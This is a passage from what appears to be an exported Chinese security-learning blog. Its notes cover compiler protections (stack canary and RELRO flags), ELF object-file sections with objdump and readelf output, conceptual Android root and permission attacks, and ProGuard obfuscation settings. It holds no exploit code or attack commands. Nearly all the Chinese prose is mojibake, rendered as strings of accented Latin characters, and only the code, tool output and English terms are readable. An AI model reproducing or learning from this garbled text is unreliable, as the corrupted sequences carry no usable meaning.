<p>gccç¼–è¯‘æ—¶ä¼ å‚<code>-fno-stack-protector</code> å°±å¯ä»¥å…³é—­ Stack Guardï¼ˆCANARYï¼‰</p>
<h1 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h1><p>relro æ˜¯ä¸€ç§ç”¨äºåŠ å¼ºå¯¹ binary æ•°æ®æ®µçš„ä¿æŠ¤çš„æŠ€æœ¯ã€‚relro åˆ†ä¸º partial relro å’Œ full relroã€‚å‚æ•° -z norelro æ˜¯å…³é—­RELROä¿æŠ¤ã€‚</p>
<p><strong>Partial RELRO</strong><br>ç°åœ¨gcc é»˜è®¤ç¼–è¯‘å°±æ˜¯ partial relroï¼Œå‚æ•°æ˜¯<code>-z relro</code><br>éƒ¨åˆ†åŒºå—ï¼ˆæ¯”å¦‚ï¼š<code>.init_array .fini_array .jcr .dynamic .got</code>)åœ¨è¢«åŠ¨æ€è£…è½½ï¼ˆåˆå§‹åŒ–ï¼‰åï¼Œå°±è¢«æ ‡è®°ä¸ºåªè¯»åŒºå—ã€‚<br><strong>Full RELRO</strong><br>gccç¼–è¯‘å‚æ•°æ˜¯<code>-z relro -z now</code><br>æ‹¥æœ‰ Partial RELRO çš„æ‰€æœ‰ç‰¹æ€§,æ‰€æœ‰å¯¼å…¥çš„ç¬¦å·éƒ½åœ¨ startup time è¢«è§£æ</p>
<h1 id="åºŸè¯"><a href="#åºŸè¯" class="headerlink" title="åºŸè¯"></a>åºŸè¯</h1><p>è¿˜æœ‰ä¸€äº›ä¿æŠ¤ï¼Œå› ä¸ºå¤ªèœï¼Œè¿˜æ²¡é‡åˆ°è¿‡ï¼Œæƒ³äº†è§£ï¼Œå¯ç›´æ¥ä¼ é€è‡³å¼€å¤´åšå®¢ã€‚</p>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux-ELFæ–‡ä»¶å­¦ä¹ </title>
    <url>/2020/04/01/Linux-%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ç›®æ ‡æ–‡ä»¶"><a href="#ç›®æ ‡æ–‡ä»¶" class="headerlink" title="ç›®æ ‡æ–‡ä»¶"></a>ç›®æ ‡æ–‡ä»¶</h1><p>å…ˆä»ç›®æ ‡æ–‡ä»¶è¯´èµ·ï¼Œç¼–è¯‘å™¨ç¼–è¯‘æºç ä¹‹åçš„å°±æ˜¯ç›®æ ‡æ–‡ä»¶ï¼Œç›®æ ‡æ–‡ä»¶é™¤äº†æ²¡æœ‰é“¾æ¥åº“ï¼Œæ ¼å¼å’ŒELFç›¸åŒã€‚</p>
<p>ç›®æ ‡æ–‡ä»¶ä¸­åŒ…æ‹¬é“¾æ¥æ˜¯æ‰€éœ€çš„ä¿¡æ¯ï¼Œå¦‚ç¬¦å·è¡¨ã€è°ƒè¯•ä¿¡æ¯ã€å­—ç¬¦ä¸²ç­‰ã€‚ä»¥â€œæ®µâ€çš„å½¢å¼å­˜å‚¨ã€‚</p>
<p>æœºå™¨æŒ‡ä»¤é€šå¸¸æ”¾åœ¨ä»£ç æ®µ<code>.text</code>æˆ–<code>.code</code>ã€‚</p>
<p>åˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡æ”¾åœ¨æ•°æ®æ®µ<code>.data</code>ã€‚</p>
<p>æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡æ”¾åœ¨æ•°æ®æ®µ<code>.bss</code>ã€‚</p>
<p><code>gcc -c SimpleSection.c</code> gcc -c æ˜¯ åªç¼–è¯‘ä¸é“¾æ¥ï¼Œå¾—åˆ°.oæ–‡ä»¶ã€‚</p>
<p><img src="/2020/04/01/Linux-æ–‡ä»¶/image-20200401225316230.png" alt="image-20200401225316230"></p>
<p><img src="/2020/04/01/Linux-æ–‡ä»¶/image-20200401230031389.png" alt="image-20200401230031389"></p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.rodata</span> <span class="comment">//åªè¯»æ•°æ®æ®µ</span></span><br><span class="line"><span class="selector-class">.comment</span> <span class="comment">//æ³¨é‡Šä¿¡æ¯æ®µ</span></span><br><span class="line"><span class="selector-class">.note</span><span class="selector-class">.GNU-stack</span> <span class="comment">//å †æ ˆæç¤ºæ®µ</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/01/Linux-æ–‡ä»¶/image-20200401230420911.png" alt="image-20200401230420911"></p>
<p><code>dec è¡¨ç¤ºä¸‰ä¸ªæ®µé•¿åº¦ä¹‹å’Œçš„åè¿›åˆ¶ï¼Œhex æ˜¯åå…­è¿›åˆ¶</code>ã€‚</p>
<h2 id="ä»£ç æ®µ"><a href="#ä»£ç æ®µ" class="headerlink" title="ä»£ç æ®µ"></a>ä»£ç æ®µ</h2><p><code>objdump -s -d SimpleSection.o</code></p>
<p>-s ä»¥16è¿›åˆ¶æ‰“å°æ®µå†…å®¹  -d æŒ‡ä»¤åæ±‡ç¼–</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="attribute">SimpleSection.o</span>:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">Contents of section .text:</span><br><span class="line"> 0000 5589e583 ec188b45 08894424 04c70424  U......E..D$...$</span><br><span class="line"> 0010 00000000 e8fcffff ffc9c355 89e583e4  ...........U....</span><br><span class="line"> 0020 f083ec20 c7442418 01000000 8b150400  ... .D$.........</span><br><span class="line"> 0030 0000a100 00000001 d0034424 18034424  ..........D$..D$</span><br><span class="line"> 0040 1c890424 e8fcffff ff8b4424 18c9c3    ...$......D$... </span><br><span class="line">Contents of section .data:</span><br><span class="line"> 0000 54000000 55000000                    T...U...        </span><br><span class="line">Contents of section .rodata:</span><br><span class="line"> 0000 25640a00                             %d..            </span><br><span class="line">Contents of section .comment:</span><br><span class="line"> 0000 00474343 3a202855 62756e74 752f4c69  .GCC: (Ubuntu/Li</span><br><span class="line"> 0010 6e61726f 20342e36 2e332d31 7562756e  naro 4.6.3-1ubun</span><br><span class="line"> 0020 74753529 20342e36 2e3300             tu5) 4.6.3.     </span><br><span class="line">Contents of section .eh_frame:</span><br><span class="line"> 0000 14000000 00000000 017a5200 017c0801  .........zR..|..</span><br><span class="line"> 0010 1b0c0404 88010000 1c000000 1c000000  ................</span><br><span class="line"> 0020 00000000 1b000000 00410e08 8502420d  .........A....B.</span><br><span class="line"> 0030 0557c50c 04040000 1c000000 3c000000  .W..........&lt;...</span><br><span class="line"> 0040 1b000000 34000000 00410e08 8502420d  ....4....A....B.</span><br><span class="line"> 0050 0570c50c 04040000                    .p......        </span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;func1&gt;:</span><br><span class="line">   0:	55                   	push   %ebp</span><br><span class="line">   1:	89 e5                	mov    %esp,%ebp</span><br><span class="line">   3:	83 ec 18             	sub    $0x18,%esp</span><br><span class="line">   6:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line">   9:	89 44 24 04          	mov    %eax,0x4(%esp)</span><br><span class="line">   d:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</span><br><span class="line">  14:	e8 fc ff ff ff       	call   15 &lt;func1+0x15&gt;</span><br><span class="line">  19:	c9                   	leave  </span><br><span class="line">  1a:	c3                   	ret    </span><br><span class="line"></span><br><span class="line">0000001b &lt;main&gt;:</span><br><span class="line">  1b:	55                   	push   %ebp</span><br><span class="line">  1c:	89 e5                	mov    %esp,%ebp</span><br><span class="line">  1e:	83 e4 f0             	and    $0xfffffff0,%esp</span><br><span class="line">  21:	83 ec 20             	sub    $0x20,%esp</span><br><span class="line">  24:	c7 44 24 18 01 00 00 	movl   $0x1,0x18(%esp)</span><br><span class="line">  2b:	00 </span><br><span class="line">  2c:	8b 15 04 00 00 00    	mov    0x4,%edx</span><br><span class="line">  32:	a1 00 00 00 00       	mov    0x0,%eax</span><br><span class="line">  37:	01 d0                	add    %edx,%eax</span><br><span class="line">  39:	03 44 24 18          	add    0x18(%esp),%eax</span><br><span class="line">  3d:	03 44 24 1c          	add    0x1c(%esp),%eax</span><br><span class="line">  41:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line">  44:	e8 fc ff ff ff       	call   45 &lt;main+0x2a&gt;</span><br><span class="line">  49:	8b 44 24 18          	mov    0x18(%esp),%eax</span><br><span class="line">  4d:	c9                   	leave  </span><br><span class="line">  4e:	c3                   	ret</span><br></pre></td></tr></table></figure>

<p>-x å¯æ‰“å°ç¬¦å·è¡¨</p>
<h2 id="å…¶ä»–æ®µ"><a href="#å…¶ä»–æ®µ" class="headerlink" title="å…¶ä»–æ®µ"></a>å…¶ä»–æ®µ</h2><p>å„ä¸ªæ®µçš„åŠŸèƒ½è¯´æ˜ã€‚</p>
<p><img src="/2020/04/01/Linux-æ–‡ä»¶/image-20200402214117791.png" alt="image-20200402214117791"></p>
<p>objcopyå¯ä»¥å°†äºŒè¿›åˆ¶æ–‡ä»¶ã€éŸ³é¢‘ç­‰æ–‡ä»¶ä½œä¸ºç›®æ ‡æ–‡ä»¶çš„ä¸€ä¸ªæ®µã€‚</p>
<p>è‡ªå®šä¹‰æ®µ :<code>__attribute__((section(&quot;name&quot;)))</code>ã€‚</p>
<h1 id="ELFæ–‡ä»¶ç»“æ„æè¿°"><a href="#ELFæ–‡ä»¶ç»“æ„æè¿°" class="headerlink" title="ELFæ–‡ä»¶ç»“æ„æè¿°"></a>ELFæ–‡ä»¶ç»“æ„æè¿°</h1><p>ELFåŸºæœ¬ç»“æ„å›¾ï¼š</p>
<p><img src="/2020/04/01/Linux-æ–‡ä»¶/image-20200402214917762.png" alt="image-20200402214917762"></p>
<p>ELFæ–‡ä»¶ä¸æ®µæœ‰å…³çš„é‡è¦ç»“æ„æ˜¯â€œæ®µè¡¨â€ã€‚</p>
<h2 id="æ–‡ä»¶å¤´"><a href="#æ–‡ä»¶å¤´" class="headerlink" title="æ–‡ä»¶å¤´"></a>æ–‡ä»¶å¤´</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">j1nx@j1nxu3-pc:~/work$ readelf -h SimpleSection.o</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF32</span><br><span class="line">  Data:                              2's complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              REL (Relocatable file)</span><br><span class="line">  Machine:                           Intel 80386</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x0</span><br><span class="line">  <span class="keyword">Start</span> <span class="keyword">of</span> program headers:          <span class="number">0</span> (<span class="keyword">bytes</span> <span class="keyword">into</span> <span class="keyword">file</span>)</span><br><span class="line">  <span class="keyword">Start</span> <span class="keyword">of</span> <span class="keyword">section</span> headers:          <span class="number">372</span> (<span class="keyword">bytes</span> <span class="keyword">into</span> <span class="keyword">file</span>)</span><br><span class="line">  Flags:                             <span class="number">0x0</span></span><br><span class="line">  <span class="keyword">Size</span> <span class="keyword">of</span> this header:               <span class="number">52</span> (<span class="keyword">bytes</span>)</span><br><span class="line">  <span class="keyword">Size</span> <span class="keyword">of</span> program headers:           <span class="number">0</span> (<span class="keyword">bytes</span>)</span><br><span class="line">  <span class="built_in">Number</span> <span class="keyword">of</span> program headers:         <span class="number">0</span></span><br><span class="line">  <span class="keyword">Size</span> <span class="keyword">of</span> <span class="keyword">section</span> headers:           <span class="number">40</span> (<span class="keyword">bytes</span>)</span><br><span class="line">  <span class="built_in">Number</span> <span class="keyword">of</span> <span class="keyword">section</span> headers:         <span class="number">13</span></span><br><span class="line">  <span class="keyword">Section</span> header <span class="keyword">string</span> <span class="keyword">table</span> <span class="keyword">index</span>: <span class="number">10</span></span><br></pre></td></tr></table></figure>

<p><strong>Magic:</strong></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">å‰<span class="number">4</span>ä¸ªå­—èŠ‚:é­”æ•°</span><br><span class="line">ç¬¬<span class="number">5</span>ä¸ªå­—èŠ‚:è¡¨ç¤ºELFæ–‡ä»¶ç±»  #<span class="number">0</span> æ— æ•ˆæ–‡ä»¶; <span class="number">1</span> <span class="number">32</span>ä½æ–‡ä»¶; <span class="number">2</span> <span class="number">64</span>ä½æ–‡ä»¶</span><br><span class="line">ç¬¬<span class="number">6</span>ä¸ªå­—èŠ‚:å­—èŠ‚åº 		 #<span class="number">0</span> å¤§ç«¯åº; <span class="number">1</span> å°ç«¯åº</span><br><span class="line">ç¬¬<span class="number">7</span>ä¸ªå­—èŠ‚:ELFä¸»ç‰ˆæœ¬å·    #ä¸€èˆ¬æ˜¯<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><strong>æ–‡ä»¶ç±»å‹ Type:</strong></p>
<p><img src="/2020/04/01/Linux-æ–‡ä»¶/image-20200402220224868.png" alt="image-20200402220224868"></p>
<p><strong>æœºå™¨ç±»å‹ Machine:</strong> </p>
<p><img src="/2020/04/01/Linux-æ–‡ä»¶/image-20200402220328247.png" alt="image-20200402220328247"></p>
]]></content>
      <categories>
        <category>ç¬”è®°</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Androidç³»ç»Ÿæ”»å‡»ä¸é˜²èŒƒ</title>
    <url>/2020/03/20/Android%E7%B3%BB%E7%BB%9F%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E8%8C%83/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="æ‰‹æœºROOT"><a href="#æ‰‹æœºROOT" class="headerlink" title="æ‰‹æœºROOT"></a>æ‰‹æœºROOT</h1><p>æŒ‡ç”¨æˆ·è·å¾—ROOTæƒé™ï¼Œå³æœ€é«˜æƒé™ã€‚ï¼ˆæˆ‘è¦åæ§½ï¼Œæˆ‘æŠŠçº¢ç±³ROOTåï¼Œä¹Ÿå°±é‚£ä¹ˆä¸€ç‚¹ç‚¹æƒé™ï¼Œå¾ˆå¤šäº‹æƒ…éƒ½ä¸åšï¼Œéª—å­ã€‚ï¼‰</p>
<h2 id="ROOTåçš„å®‰å…¨éšæ‚£"><a href="#ROOTåçš„å®‰å…¨éšæ‚£" class="headerlink" title="ROOTåçš„å®‰å…¨éšæ‚£"></a>ROOTåçš„å®‰å…¨éšæ‚£</h2><ul>
<li>å¯èƒ½å¯¼è‡´è¯¯åˆ é€ æˆç³»ç»Ÿä¸ç¨³å®š</li>
<li>ç—…æ¯’å…¥ä¾µï¼Œè‡ªå·±æ‹¥æœ‰rootæƒé™ï¼Œæ”»å‡»è€…ä¹Ÿå¯ä»¥æ‹¥æœ‰ï¼Œæ‰€ä»¥ç—…æ¯’æ›´å®¹æ˜“å…¥ä¾µã€‚</li>
<li>éšç§æ•°æ®æš´éœ²ï¼Œrootæƒé™å¯ç›´æ¥è¯»æ–‡ä»¶ï¼Œæ•°æ®å®¹æ˜“æš´éœ²</li>
</ul>
<h2 id="ROOTåŸç†"><a href="#ROOTåŸç†" class="headerlink" title="ROOTåŸç†"></a>ROOTåŸç†</h2><p>æˆ‘æ‰çŸ¥é“ï¼Œå¾ˆå¤šrootå·¥å…·æ˜¯åˆ©ç”¨äº†AndroidåŸæœ¬çš„æ¼æ´ï¼Œä¸€ç›´ä»¥ä¸ºæ˜¯ä¸“é—¨é¢„ç•™çš„â€¦â€¦.åˆ©ç”¨ææƒæ¼æ´è¿›è¡Œrootææƒã€‚</p>
<p>å¯ä»¥ä¸‹è½½Xray for Android æ˜¯å¦å¯ä»¥é€šè¿‡æ¼æ´è·å–rootæƒé™ã€‚</p>
<p>suä¸superuser.apkåä½œå¯¹rootæƒé™è¿›è¡Œç®¡ç†ã€‚</p>
<h1 id="Androidæƒé™æ”»å‡»"><a href="#Androidæƒé™æ”»å‡»" class="headerlink" title="Androidæƒé™æ”»å‡»"></a>Androidæƒé™æ”»å‡»</h1><h2 id="æƒé™æ£€æŸ¥æœºåˆ¶"><a href="#æƒé™æ£€æŸ¥æœºåˆ¶" class="headerlink" title="æƒé™æ£€æŸ¥æœºåˆ¶"></a>æƒé™æ£€æŸ¥æœºåˆ¶</h2><p>ä½¿ç”¨ç‰¹å®šæƒé™ï¼Œéœ€è¦åœ¨AndroidManifestä¸­è®¾ç½®ã€‚</p>
<h2 id="ä¸²è°‹æƒé™æ”»å‡»"><a href="#ä¸²è°‹æƒé™æ”»å‡»" class="headerlink" title="ä¸²è°‹æƒé™æ”»å‡»"></a>ä¸²è°‹æƒé™æ”»å‡»</h2><p>é€šè¿‡å…¶ä»–ç¨‹åºçš„Androidç»„ä»¶çªç ´æƒé™é™åˆ¶ã€‚</p>
<h2 id="æƒé™æ”»å‡»æ£€æµ‹"><a href="#æƒé™æ”»å‡»æ£€æµ‹" class="headerlink" title="æƒé™æ”»å‡»æ£€æµ‹"></a>æƒé™æ”»å‡»æ£€æµ‹</h2><p>Mercuryå¯æ‰¹é‡æ£€æµ‹æƒé™æ”»å‡»ç»„ä»¶ã€‚</p>
<h1 id="Androidç»„ä»¶å®‰å…¨"><a href="#Androidç»„ä»¶å®‰å…¨" class="headerlink" title="Androidç»„ä»¶å®‰å…¨"></a>Androidç»„ä»¶å®‰å…¨</h1><h2 id="Activityå®‰å…¨"><a href="#Activityå®‰å…¨" class="headerlink" title="Activityå®‰å…¨"></a>Activityå®‰å…¨</h2><p>é¦–å…ˆçœ‹<code>android:exported</code>æ˜¯å¦å¯å¯¼å‡ºã€‚</p>
<p>å…è®¸ç‰¹å®šç¨‹åºéœ€è¦ä½¿ç”¨<code>android:permission</code>ï¼š</p>
<p><img src="/2020/03/20/Androidç³»ç»Ÿæ”»å‡»ä¸é˜²èŒƒ/image-20200324215326188.png" alt="image-20200324215326188"></p>
<p>å¦‚æœè¦è®¿é—®å¸¦æœ‰<code>android:permission</code>çš„Activutyï¼Œéœ€è¦åœ¨AndroidManifestä¸­å£°æ˜æƒé™ï¼š</p>
<p><img src="/2020/03/20/Androidç³»ç»Ÿæ”»å‡»ä¸é˜²èŒƒ/image-20200324215426533.png" alt="image-20200324215426533"></p>
<h2 id="Broadcast-Receiverå®‰å…¨"><a href="#Broadcast-Receiverå®‰å…¨" class="headerlink" title="Broadcast Receiverå®‰å…¨"></a>Broadcast Receiverå®‰å…¨</h2><p>ä¸€èˆ¬æ¥è¯´ï¼Œä¸€ä¸ªå¹¿æ’­å¯ä»¥è¢«ç›¸åº”çš„Actionæ¥æ”¶ï¼Œå¯èƒ½é€ æˆå¹¿æ’­è¢«çªƒå–ã€‚</p>
<p>å¯ä»¥é€šè¿‡intentæŒ‡å®šæŸä¸ªAndroidç»„ä»¶æˆ–ç±»æ¥æ”¶å¹¿æ’­ã€‚</p>
<h2 id="Serviceå®‰å…¨"><a href="#Serviceå®‰å…¨" class="headerlink" title="Serviceå®‰å…¨"></a>Serviceå®‰å…¨</h2><p>serviceåœ¨åå°è¿è¡Œï¼Œå¯èƒ½å‘ç”Ÿå¦‚ä¸‹å®‰å…¨é—®é¢˜ï¼š</p>
<p><img src="/2020/03/20/Androidç³»ç»Ÿæ”»å‡»ä¸é˜²èŒƒ/image-20200324220934330.png" alt="image-20200324220934330"></p>
<p>å¯é€šè¿‡<code>android:exported</code>å’Œ<code>android:permission</code>é™åˆ¶æƒé™ã€‚</p>
<h2 id="Content-Provider"><a href="#Content-Provider" class="headerlink" title="Content Provider"></a>Content Provider</h2><p>å†…å®¹æä¾›è€…ï¼Œç”¨äºç¨‹åºä¹‹é—´çš„æ•°æ®äº¤æ¢ã€‚</p>
<p>è¦é™åˆ¶å…¶è¯»å†™ç­‰æƒé™ï¼Œå¦åˆ™å¯èƒ½ä¼šå­˜åœ¨ä¸²è°‹æƒé™æ”»å‡»ã€‚</p>
]]></content>
      <categories>
        <category>ç¬”è®°</category>
        <category>Androidé€†å‘</category>
      </categories>
  </entry>
  <entry>
    <title>Androidè½¯ä»¶çš„åç ´è§£æŠ€æœ¯</title>
    <url>/2020/03/18/Android%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%8F%8D%E7%A0%B4%E8%A7%A3%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Androidé€†å‘å¯ä»¥é€šè¿‡å››ä¸ªæ­¥éª¤ï¼šåç¼–è¯‘ã€é™æ€åˆ†æã€åŠ¨æ€è°ƒè¯•ã€é‡ç¼–è¯‘ã€‚</p>
<h1 id="å¯¹æŠ—åç¼–è¯‘"><a href="#å¯¹æŠ—åç¼–è¯‘" class="headerlink" title="å¯¹æŠ—åç¼–è¯‘"></a>å¯¹æŠ—åç¼–è¯‘</h1><h2 id="å¦‚ä½•å¯¹æŠ—åç¼–è¯‘å·¥å…·"><a href="#å¦‚ä½•å¯¹æŠ—åç¼–è¯‘å·¥å…·" class="headerlink" title="å¦‚ä½•å¯¹æŠ—åç¼–è¯‘å·¥å…·"></a>å¦‚ä½•å¯¹æŠ—åç¼–è¯‘å·¥å…·</h2><p>å¯»æ‰¾åç¼–è¯‘å·¥å…·çš„ç¼ºé™·ï¼Œä½¿å…¶åç¼–è¯‘å¤±è´¥ã€‚</p>
<h3 id="é˜…è¯»åç¼–è¯‘å·¥å…·æºç "><a href="#é˜…è¯»åç¼–è¯‘å·¥å…·æºç " class="headerlink" title="é˜…è¯»åç¼–è¯‘å·¥å…·æºç "></a>é˜…è¯»åç¼–è¯‘å·¥å…·æºç </h3><p>éœ€è¦è¾ƒå¼ºçš„ä»£ç åˆ†æèƒ½åŠ›</p>
<h3 id="å‹åŠ›æµ‹è¯•"><a href="#å‹åŠ›æµ‹è¯•" class="headerlink" title="å‹åŠ›æµ‹è¯•"></a>å‹åŠ›æµ‹è¯•</h3><p>é€šè¿‡è„šæœ¬æµ‹è¯•å¤§é‡apkï¼ŒæŸ¥æ‰¾åç¼–è¯‘å·¥å…·çš„ç¼ºé™·</p>
<h2 id="å¯¹æŠ—dex2jar"><a href="#å¯¹æŠ—dex2jar" class="headerlink" title="å¯¹æŠ—dex2jar"></a>å¯¹æŠ—dex2jar</h2><p>dex2jarå¯å°†dexæ–‡ä»¶è½¬æ¢ä¸ºjaræ–‡ä»¶ã€‚</p>
<h1 id="å¯¹æŠ—é™æ€åˆ†æ"><a href="#å¯¹æŠ—é™æ€åˆ†æ" class="headerlink" title="å¯¹æŠ—é™æ€åˆ†æ"></a>å¯¹æŠ—é™æ€åˆ†æ</h1><h2 id="ä»£ç æ··æ·†æŠ€æœ¯"><a href="#ä»£ç æ··æ·†æŠ€æœ¯" class="headerlink" title="ä»£ç æ··æ·†æŠ€æœ¯"></a>ä»£ç æ··æ·†æŠ€æœ¯</h2><p>ä½¿ç”¨ProGuardè¿›è¡Œæ··æ·†ã€‚</p>
<ol>
<li>åœ¨project.propertiesæ–‡ä»¶ä¸­æ·»åŠ <code>proguard.config=proguard.cfg</code>ã€‚</li>
<li>åœ¨proguard.cfgä¸­è®¾ç½®éœ€è¦æ··æ·†å’Œä¿ç•™çš„ç±»å’Œæ–¹æ³•ã€‚</li>
</ol>
<p>ç°åœ¨åœ¨ASé‡Œä¼šæœ‰è¿™ä¸ªæ–‡ä»¶ï¼š</p>
<p><img src="/2020/03/18/Androidè½¯ä»¶çš„åç ´è§£æŠ€æœ¯/image-20200319161948039.png" alt="image-20200319161948039"></p>
<p>é…ç½® build.gradle,</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">release &#123;</span><br><span class="line">            <span class="comment">// ä¸æ˜¾ç¤ºlog</span></span><br><span class="line">            buildConfigField <span class="string">"boolean"</span>, <span class="string">"LOG_DEBUG"</span>, <span class="string">"false"</span></span><br><span class="line">            <span class="comment">// æ··æ·†</span></span><br><span class="line">            minifyEnabled <span class="literal">true</span></span><br><span class="line">            <span class="comment">// Zipalignä¼˜åŒ–</span></span><br><span class="line">            zipAlignEnabled <span class="literal">true</span></span><br><span class="line">            <span class="comment">// ç§»é™¤æ— ç”¨çš„resource</span></span><br><span class="line">            shrinkResources <span class="literal">true</span></span><br><span class="line">            <span class="comment">// æ··æ·†é…ç½®</span></span><br><span class="line">            proguardFiles get<span class="constructor">DefaultProguardFile('<span class="params">proguard</span>-<span class="params">android</span>.<span class="params">txt</span>')</span>, 'proguard-rules.pro'</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ç”¨debugæ¨¡å¼æ··æ·†çš„æ—¶å€™ï¼Œapkæ‰“ä¸å¼€ï¼Œreleaseç‰ˆçš„æˆåŠŸäº†ã€‚</p>
<h3 id="proguard"><a href="#proguard" class="headerlink" title="proguard"></a>proguard</h3><p>proguardæœ‰ä»¥ä¸‹åŠŸèƒ½ï¼š</p>
<ul>
<li>å‹ç¼©(Shrink)ï¼šæ£€æµ‹å¹¶ç§»é™¤ä»£ç ä¸­æ— ç”¨çš„ç±»ã€å­—æ®µã€æ–¹æ³•å’Œç‰¹æ€§ï¼ˆAttributeï¼‰ã€‚</li>
<li>ä¼˜åŒ–(Optimize)ï¼šå¯¹å­—èŠ‚ç è¿›è¡Œä¼˜åŒ–ï¼Œç§»é™¤æ— ç”¨çš„æŒ‡ä»¤ã€‚</li>
<li>æ··æ·†(Obfuscate)ï¼šä½¿ç”¨aï¼Œbï¼Œcï¼Œdè¿™æ ·ç®€çŸ­è€Œæ— æ„ä¹‰çš„åç§°ï¼Œå¯¹ç±»ã€å­—æ®µå’Œæ–¹æ³•è¿›è¡Œé‡å‘½åã€‚</li>
<li>é¢„æ£€(Preveirfy)ï¼šåœ¨Javaå¹³å°ä¸Šå¯¹å¤„ç†åçš„ä»£ç è¿›è¡Œé¢„æ£€ï¼Œç¡®ä¿åŠ è½½çš„classæ–‡ä»¶æ˜¯å¯æ‰§è¡Œçš„ã€‚</li>
</ul>
<p>å¸¸ç”¨é…ç½®</p>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span> å…¬å…± <span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#æŒ‡å®šä»£ç çš„å‹ç¼©çº§åˆ«</span></span><br><span class="line">-optimizationpasses <span class="number">5</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># æ··æ·†æ—¶æ‰€é‡‡ç”¨çš„ç®—æ³•</span></span><br><span class="line">-optimizations !code<span class="regexp">/simplification/arithmetic,!field/</span>*,!<span class="class"><span class="keyword">class</span>/<span class="title">merging</span>/*</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#è®°å½•ç”Ÿæˆçš„æ—¥å¿—æ•°æ®,gradle buildæ—¶åœ¨æœ¬é¡¹ç›®æ ¹ç›®å½•è¾“å‡º</span></span><br><span class="line"><span class="comment">#apk åŒ…å†…æ‰€æœ‰ class çš„å†…éƒ¨ç»“æ„</span></span><br><span class="line">-dump class_files.txt</span><br><span class="line"><span class="comment">#æœªæ··æ·†çš„ç±»å’Œæˆå‘˜</span></span><br><span class="line">-printseeds seeds.txt</span><br><span class="line"><span class="comment">#åˆ—å‡ºä» apk ä¸­åˆ é™¤çš„ä»£ç </span></span><br><span class="line">-printusage unused.txt</span><br><span class="line"><span class="comment">#æ··æ·†å‰åçš„æ˜ å°„</span></span><br><span class="line">-printmapping mapping.txt</span><br><span class="line"> </span><br><span class="line"><span class="comment">#ç§»é™¤logä»£ç </span></span><br><span class="line">-assumenosideeffects <span class="class"><span class="keyword">class</span> <span class="title">android</span>.<span class="title">util</span>.<span class="title">Log</span> &#123;</span></span><br><span class="line">    public static *** v(...);</span><br><span class="line">    public static *** i(...);</span><br><span class="line">    public static *** d(...);</span><br><span class="line">    public static *** w(...);</span><br><span class="line">    public static *** e(...);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">#ä¸æ··æ·†åå°„ç”¨åˆ°çš„ç±»</span></span><br><span class="line">-keepattributes Signature</span><br><span class="line">-keepattributes EnclosingMethod</span><br><span class="line"> </span><br><span class="line"><span class="comment">#ä¿æŒç»§æ‰¿è‡ªç³»ç»Ÿç±»çš„classä¸è¢«æ··æ·†</span></span><br><span class="line">-keep public <span class="class"><span class="keyword">class</span> * <span class="keyword">extends</span> <span class="title">android</span>.<span class="title">app</span>.<span class="title">Activity</span></span></span><br><span class="line">-keep public <span class="class"><span class="keyword">class</span> * <span class="keyword">extends</span> <span class="title">android</span>.<span class="title">app</span>.<span class="title">Application</span></span></span><br><span class="line">-keep public <span class="class"><span class="keyword">class</span> * <span class="keyword">extends</span> <span class="title">android</span>.<span class="title">app</span>.<span class="title">Service</span></span></span><br><span class="line">-keep public <span class="class"><span class="keyword">class</span> * <span class="keyword">extends</span> <span class="title">android</span>.<span class="title">content</span>.<span class="title">BroadcastReceiver</span></span></span><br><span class="line">-keep public <span class="class"><span class="keyword">class</span> * <span class="keyword">extends</span> <span class="title">android</span>.<span class="title">content</span>.<span class="title">ContentProvider</span></span></span><br><span class="line">-keep public <span class="class"><span class="keyword">class</span> * <span class="keyword">extends</span> <span 